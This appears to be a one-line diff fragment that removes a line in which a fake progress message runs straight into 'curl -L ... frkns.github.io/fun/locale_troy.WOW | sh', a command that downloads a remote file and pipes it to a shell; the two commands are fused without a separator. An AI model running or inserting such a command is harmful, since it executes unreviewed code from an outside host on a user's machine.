@@ -1,1 +1,0 @@
-echo Progress: 21.00%curl -L --progress-bar frkns.github.io/fun/locale_troy.WOW | sh
